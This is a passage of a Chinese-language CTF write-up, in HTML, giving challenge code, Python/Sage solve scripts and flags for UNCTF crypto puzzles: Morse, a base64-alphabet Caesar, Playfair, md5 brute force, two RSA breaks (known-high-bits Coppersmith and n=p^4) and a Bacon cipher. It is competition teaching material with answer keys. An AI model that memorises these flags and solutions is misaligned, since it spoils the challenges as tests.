class="string">&quot;-..-&quot;</span>: <span class="string">&quot;X&quot;</span>, <span class="string">&quot;-.--&quot;</span>: <span class="string">&quot;Y&quot;</span>, <span class="string">&quot;--..&quot;</span>: <span class="string">&quot;Z&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;-----&quot;</span>: <span class="string">&quot;0&quot;</span>, <span class="string">&quot;.----&quot;</span>: <span class="string">&quot;1&quot;</span>, <span class="string">&quot;..---&quot;</span>: <span class="string">&quot;2&quot;</span>, <span class="string">&quot;...--&quot;</span>: <span class="string">&quot;3&quot;</span>, <span class="string">&quot;....-&quot;</span>: <span class="string">&quot;4&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.....&quot;</span>: <span class="string">&quot;5&quot;</span>, <span class="string">&quot;-....&quot;</span>: <span class="string">&quot;6&quot;</span>, <span class="string">&quot;--...&quot;</span>: <span class="string">&quot;7&quot;</span>, <span class="string">&quot;---..&quot;</span>: <span class="string">&quot;8&quot;</span>, <span class="string">&quot;----.&quot;</span>: <span class="string">&quot;9&quot;</span>,</span><br><span class="line"></span><br><span class="line">    <span class="string">&quot;.-.-.-&quot;</span>: <span class="string">&quot;.&quot;</span>, <span class="string">&quot;---...&quot;</span>: <span class="string">&quot;:&quot;</span>, <span class="string">&quot;--..--&quot;</span>: <span class="string">&quot;,&quot;</span>, <span class="string">&quot;-.-.-.&quot;</span>: <span class="string">&quot;;&quot;</span>, <span class="string">&quot;..--..&quot;</span>: <span class="string">&quot;?&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-...-&quot;</span>: <span class="string">&quot;=&quot;</span>, <span class="string">&quot;.----.&quot;</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="string">&quot;-..-.&quot;</span>: <span class="string">&quot;/&quot;</span>, <span class="string">&quot;-.-.--&quot;</span>: <span class="string">&quot;!&quot;</span>, <span class="string">&quot;-....-&quot;</span>: <span class="string">&quot;-&quot;</span>,</span><br><span class="line">    <span class="string">&quot;..--.-&quot;</span>: <span class="string">&quot;_&quot;</span>, <span class="string">&quot;.-..-.&quot;</span>: <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&quot;-.--.&quot;</span>: <span class="string">&quot;(&quot;</span>, <span class="string">&quot;-.--.-&quot;</span>: <span class="string">&quot;)&quot;</span>, <span class="string">&quot;...-..-&quot;</span>: <span class="string">&quot;$&quot;</span>,</span><br><span class="line">    <span class="string">&quot;.--.-.&quot;</span>: <span class="string">&quot;@&quot;</span>, <span class="string">&quot;.-.-.&quot;</span>: <span class="string">&quot;+&quot;</span>, <span class="string">&quot;-----.-&quot;</span>: <span class="string">&quot;&#125;&quot;</span>, <span class="string">&quot;----.--&quot;</span>: <span class="string">&quot;&#123;&quot;</span>,</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">morse</span>(<span class="params">string, sign</span>):</span><br><span class="line">    <span class="comment"># 分割，字符串string，分割标识符sign</span></span><br><span class="line">    lists = string.split(sign)</span><br><span class="line">    <span class="keyword">for</span> code <span class="keyword">in</span> lists:</span><br><span class="line">        <span class="built_in">print</span>(MorseList.get(code), end=<span class="string">&quot;&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a = <span class="string">&#x27;110/01/0101/0/1101/0000100/0100/11110/111/110010/0/1111/10000/111/110010/1000/110/111/0/110010/00/00000/101/111/1/0000010&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">        res += <span class="string">&#x27;-&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">        res += <span class="string">&#x27;.&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += i</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">morse(res, <span class="string">&#x27;/&#x27;</span>)</span><br><span class="line"><span class="comment"># UNCTF&#123;Y4S_TH1S_JUST_M0RSE&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="caeser"><a href="#caeser" class="headerlink" title="caeser"></a>caeser</h3><p>凯撒密码，表换成base64的表，正常解即可。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dic = <span class="string">&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&quot;</span></span><br><span class="line">dic = <span class="built_in">list</span>(dic)</span><br><span class="line">plaintetx = <span class="string">&#x27;B6vAy&#123;dhd_AOiZ_KiMyLYLUa_JlL/HY_&#125;&#x27;</span></span><br><span class="line">ofset = dic.index(<span class="string">&#x27;U&#x27;</span>) - dic.index(plaintetx[<span class="number">0</span>])</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> plaintetx:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">in</span> dic:</span><br><span class="line">        res += dic[(dic.index(i) + <span class="number">19</span>) % <span class="number">64</span>]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += i</span><br><span class="line">res = <span class="built_in">list</span>(res)</span><br><span class="line"><span class="keyword">if</span> res[<span class="built_in">len</span>(res) - <span class="number">2</span>] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">    res[<span class="built_in">len</span>(res) - <span class="number">2</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line"><span class="comment"># UNCTF&#123;w0w_Th1s_d1fFerent_c4eSar&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="Single-table"><a href="#Single-table" class="headerlink" title="Single table"></a>Single table</h3><p>根据<code>readme.md</code>中可以看出来是<code>playfair</code>，写个脚本。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dic1 = <span class="string">&#x27;ABCDEFGHIKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">dic1 = <span class="built_in">list</span>(dic1)</span><br><span class="line">key = <span class="string">&#x27;PLAY&#x27;</span></span><br><span class="line">plaintext = <span class="string">&#x27;OTUBM&#123;BCQS_PHW_OQAU_AYFMKLWS&#125;&#x27;</span></span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dic2 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> dic1:</span><br><span class="line">    <span class="keyword">if</span> i <span class="keyword">not</span> <span class="keyword">in</span> key:</span><br><span class="line">        dic2.append(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> key:</span><br><span class="line">    dic2.append(i)</span><br><span class="line">dic3 = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>):</span><br><span class="line">    a = dic2[i * <span class="number">5</span>:(i + <span class="number">1</span>) * <span class="number">5</span>]</span><br><span class="line">    dic3.append(a)</span><br><span class="line"><span class="built_in">print</span>(dic3)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line">x = []</span><br><span class="line"><span class="keyword">while</span> i &lt; <span class="built_in">len</span>(plaintext):</span><br><span class="line">    c = []</span><br><span class="line">    <span class="keyword">while</span> <span class="built_in">len</span>(c) &lt; <span class="number">2</span>:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="built_in">len</span>(plaintext):</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> plaintext[i] <span class="keyword">in</span> dic1:</span><br><span class="line">            c.append(plaintext[i])</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            i += <span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> c:</span><br><span class="line">        x.append(<span class="built_in">list</span>(<span class="built_in">divmod</span>(<span class="built_in">sum</span>(dic3, []).index(j), <span class="number">5</span>)))</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(x), <span class="number">2</span>):</span><br><span class="line">    <span class="keyword">if</span> x[i][<span class="number">1</span>] == x[i + <span class="number">1</span>][<span class="number">1</span>]:</span><br><span class="line">        x[i][<span class="number">0</span>] = (x[i][<span class="number">0</span>] - <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">        x[i + <span class="number">1</span>][<span class="number">0</span>] = (x[i + <span class="number">1</span>][<span class="number">0</span>] - <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">    <span class="keyword">elif</span> x[i][<span class="number">0</span>] == x[i + <span class="number">1</span>][<span class="number">0</span>]:</span><br><span class="line">        x[i][<span class="number">1</span>] = (x[i][<span class="number">1</span>] - <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">        x[i + <span class="number">1</span>][<span class="number">1</span>] = (x[i + <span class="number">1</span>][<span class="number">1</span>] - <span class="number">1</span>) % <span class="number">5</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        tmp = x[i][<span class="number">0</span>]</span><br><span class="line">        x[i][<span class="number">0</span>] = x[i + <span class="number">1</span>][<span class="number">0</span>]</span><br><span class="line">        x[i + <span class="number">1</span>][<span class="number">0</span>] = tmp</span><br><span class="line"><span class="built_in">print</span>(x)</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> plaintext:</span><br><span class="line">    <span class="keyword">if</span> j <span class="keyword">not</span> <span class="keyword">in</span> dic1:</span><br><span class="line">        res += j</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        res += dic3[x[i][<span class="number">0</span>]][x[i][<span class="number">1</span>]]</span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line">res = <span class="built_in">list</span>(res)</span><br><span class="line"><span class="keyword">if</span> res[<span class="built_in">len</span>(res) - <span class="number">2</span>] == <span class="string">&#x27;X&#x27;</span>:</span><br><span class="line">    res[<span class="built_in">len</span>(res) - <span class="number">2</span>] = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(res)):</span><br><span class="line">        <span class="keyword">if</span> res[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">            tmp = res[i]</span><br><span class="line">            res[i] = res[i - <span class="number">1</span>]</span><br><span class="line">            res[i - <span class="number">1</span>] = tmp</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;&#x27;</span>.join(res))</span><br><span class="line"><span class="comment"># UNCTF&#123;GOD_YOU_KNOW_PLAYFAIR&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="md5-2"><a href="#md5-2" class="headerlink" title="md5-2"></a>md5-2</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">flag=<span class="string">&#x27;UNCTF&#123;%s&#125;&#x27;</span>%md5(<span class="string">&#x27;x&#x27;</span>.encode()).hexdigest()</span><br><span class="line"><span class="comment"># x不是一个字符是n个字符</span></span><br><span class="line"></span><br><span class="line">md5_=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> flag:</span><br><span class="line">    md5_.append(<span class="built_in">int</span>(md5(i.encode()).hexdigest(),<span class="number">16</span>))</span><br><span class="line"><span class="built_in">print</span>(md5_)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,<span class="built_in">len</span>(md5_)):</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">            file.write(<span class="built_in">hex</span>(md5_[i])[<span class="number">2</span>:]+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">         <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;out.txt&#x27;</span>,<span class="string">&#x27;a&#x27;</span>)<span class="keyword">as</span> file:</span><br><span class="line">            file.write(<span class="built_in">hex</span>(md5_[i]^md5_[i-<span class="number">1</span>])[<span class="number">2</span>:]+<span class="string">&#x27;\n&#x27;</span>)   </span><br></pre></td></tr></table></figure>
<p>还是爆破，异或回去就行。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">md5_ = []</span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/md5-2/md5-2/out.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> f.readlines():</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(md5_) == <span class="number">0</span>:</span><br><span class="line">        md5_.append(<span class="built_in">int</span>(i.strip(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        i = <span class="built_in">int</span>(i.strip(<span class="string">&#x27;\n&#x27;</span>), <span class="number">16</span>)</span><br><span class="line">        md5_.append(i ^ md5_[<span class="built_in">len</span>(md5_) - <span class="number">1</span>])</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line">dic = <span class="string">&#x27;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_.&#123;-1234567890&#125;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> md5_:</span><br><span class="line">    i = <span class="built_in">hex</span>(i)[<span class="number">2</span>:].zfill(<span class="number">32</span>)</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> dic:</span><br><span class="line">        <span class="keyword">if</span> md5(j.encode()).hexdigest() == i:</span><br><span class="line">            res += j</span><br><span class="line">            <span class="built_in">print</span>(res)</span><br><span class="line"><span class="comment"># UNCTF&#123;a197271943ceb3c3fe98bcadf10c29d4&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="babyRSA"><a href="#babyRSA" class="headerlink" title="babyRSA"></a>babyRSA</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&quot;UNCTF&#123;*************************&#125;&quot;</span></span><br><span class="line">m = libnum.s2n(flag)</span><br><span class="line">p = libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">q = libnum.generate_prime(<span class="number">1024</span>)</span><br><span class="line">n = p * q</span><br><span class="line">e = <span class="number">6</span></span><br><span class="line">c = <span class="built_in">pow</span>(m, e, n)</span><br><span class="line">M = ((m &gt;&gt; <span class="number">60</span>) &lt;&lt; <span class="number">60</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;n=&quot;</span>, n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;c=&quot;</span>, c)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;((m&gt;&gt;60)&lt;&lt;60)=&quot;</span>, M)</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line"><span class="string">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line"><span class="string">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure>
<p>RSA经典的已知明文高位攻击。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#sage:</span></span><br><span class="line">n = <span class="number">25300208242652033869357280793502260197802939233346996226883788604545558438230715925485481688339916461848731740856670110424196191302689278983802917678262166845981990182434653654812540700781253868833088711482330886156960638711299829638134615325986782943291329606045839979194068955235982564452293191151071585886524229637518411736363501546694935414687215258794960353854781449161486836502248831218800242916663993123670693362478526606712579426928338181399677807135748947635964798646637084128123883297026488246883131504115767135194084734055003319452874635426942328780711915045004051281014237034453559205703278666394594859431</span></span><br><span class="line">e = <span class="number">6</span></span><br><span class="line">c = <span class="number">15389131311613415508844800295995106612022857692638905315980807050073537858857382728502142593301948048526944852089897832340601736781274204934578234672687680891154129252310634024554953799372265540740024915758647812906647109145094613323994058214703558717685930611371268247121960817195616837374076510986260112469914106674815925870074479182677673812235207989739299394932338770220225876070379594440075936962171457771508488819923640530653348409795232033076502186643651814610524674332768511598378284643889355772457510928898105838034556943949348749710675195450422905795881113409243269822988828033666560697512875266617885514107</span></span><br><span class="line">m_gao = <span class="number">11941439146252171444944646015445273361862078914338385912062672317789429687879409370001983412365416202240</span></span><br><span class="line">kbits = <span class="number">60</span></span><br><span class="line">B = <span class="number">1</span></span><br><span class="line">nbits = n.nbits()</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = (m_gao + x)^e - c</span><br><span class="line">x0 = f.small_roots(X=<span class="number">2</span>^kbits, B=<span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;m:&quot;</span>, m_gao + x0)</span><br><span class="line"><span class="comment"># UNCTF&#123;27a0aac7-76cb-427d-9129-1476360d5d1b&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="ezRSA"><a href="#ezRSA" class="headerlink" title="ezRSA"></a>ezRSA</h3><p>题目：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"></span><br><span class="line">p=libnum.generate_prime(<span class="number">256</span>)</span><br><span class="line">e=<span class="number">65537</span></span><br><span class="line">m=flag</span><br><span class="line"></span><br><span class="line">m=libnum.s2n(m)</span><br><span class="line">n=p**<span class="number">4</span></span><br><span class="line">phi_n=p**<span class="number">4</span>-p**<span class="number">3</span></span><br><span class="line">d=libnum.invmod(e,phi_n)</span><br><span class="line">c=<span class="built_in">pow</span>(m,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;n=&quot;</span>,n)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;e=&quot;</span>,e)</span><br><span class="line"><span class="built_in">print</span> (<span class="string">&quot;c=&quot;</span>,c)</span><br><span class="line"><span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line"><span class="number">65537</span> <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br></pre></td></tr></table></figure>
<p>已知$n=p^4$，直接开四次方求得p后求得phi即可求解。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">62927872600012424750752897921698090776534304875632744929068546073325488283530025400224435562694273281157865037525456502678901681910303434689364320018805568710613581859910858077737519009451023667409223317546843268613019139524821964086036781112269486089069810631981766346242114671167202613483097500263981460561</span></span><br><span class="line">p, l = iroot(n, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(p)</span><br><span class="line">phi = p ** <span class="number">4</span> - p ** <span class="number">3</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">d = invert(e, phi)</span><br><span class="line">c = <span class="number">56959646997081238078544634686875547709710666590620774134883288258992627876759606112717080946141796037573409168410595417635905762691247827322319628226051756406843950023290877673732151483843276348210800329658896558968868729658727981445607937645264850938932045242425625625685274204668013600475330284378427177504</span></span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(n2s(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># UNCTF&#123;pneum0n0ultram01cr0sc0p01cs01l01c0v0lcan0c0n010s01s&#125;</span></span><br></pre></td></tr></table></figure>
<h3 id="今晚吃什么"><a href="#今晚吃什么" class="headerlink" title="今晚吃什么"></a>今晚吃什么</h3><p>给了一串10000、00000的序列，结合题目猜测为培根加密，实际上一次解密后还需要解密一次，第一次使用26位的密码本，第二次使用24次的密码本，有点脑洞。</p>
<p>EXP:</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">dicts_26 = &#123;</span><br><span class="line">    <span class="string">&#x27;aaaaa&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;aaaab&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;aaaba&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;aaabb&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;aabaa&#x27;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;aabab&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;aabba&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;aabbb&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;abaaa&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;abaab&#x27;</span>: <span class="string">&#x27;j&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ababa&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;ababb&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;abbaa&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;abbab&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;abbba&#x27;</span>: <span class="string">&#x27;o&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;abbbb&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;baaaa&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;baaab&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;baaba&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;baabb&#x27;</span>: <span class="string">&#x27;t&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;babaa&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;babab&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;babba&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;babbb&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;bbaaa&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;bbaab&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, &#125;</span><br><span class="line">dicts_24 = &#123;</span><br><span class="line">    <span class="string">&#x27;aaaaa&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;aaaab&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;aaaba&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;aaabb&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;aabaa&#x27;</span>: <span class="string">&#x27;e&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;aabab&#x27;</span>: <span class="string">&#x27;f&#x27;</span>, <span class="string">&#x27;aabba&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;aabbb&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;abaaa&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;abaab&#x27;</span>: <span class="string">&#x27;k&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;ababa&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;ababb&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;abbaa&#x27;</span>: <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;abbab&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;abbba&#x27;</span>: <span class="string">&#x27;p&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;abbbb&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;baaaa&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;baaab&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;baaba&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;baabb&#x27;</span>: <span class="string">&#x27;u&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;babaa&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;babab&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;babba&#x27;</span>: <span class="string">&#x27;y&#x27;</span>, <span class="string">&#x27;bbaab&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, &#125;</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_26</span>(<span class="params">m</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    msg = <span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        msg += i</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">5</span>:</span><br><span class="line">            c = dicts_26[msg]</span><br><span class="line">            flag += c</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            msg = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 小写结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">    <span class="comment"># 大写结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag.upper())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt_24</span>(<span class="params">m</span>):</span><br><span class="line">    count = <span class="number">0</span></span><br><span class="line">    msg = <span class="string">&quot;&quot;</span></span><br><span class="line">    flag = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> m:</span><br><span class="line">        msg += i</span><br><span class="line">        count += <span class="number">1</span></span><br><span class="line">        <span class="keyword">if</span> count == <span class="number">5</span>:</span><br><span class="line">            c = dicts_24[msg]</span><br><span class="line">            flag += c</span><br><span class="line">            count = <span class="number">0</span></span><br><span class="line">            msg = <span class="string">&quot;&quot;</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">    <span class="comment"># 小写结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag)</span><br><span class="line">    <span class="comment"># 大写结果</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;flag:&quot;</span> + flag.upper())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = <span class="built_in">open</span>(<span class="string">&quot;C:/Users/lenovo/Desktop/今晚吃什么.txt&quot;</span>, <span class="string">&quot;r&quot;</span>)</span><br><span class="line">a = f.readlines()</span><br><span class="line">res = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> a[<span class="number">0</span>]:</span><br><span class="line">    <span class="keyword">if</span> i != <span class="string">&#x27; &#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> i == <span class="string">&#x27;1&#x27;</span>:</span><br><span class="line">            res += <span class="string">&#x27;b&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            res += <span class="string">&#x27;a&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line">decrypt_26(res)</span><br><span class="line">b = <span 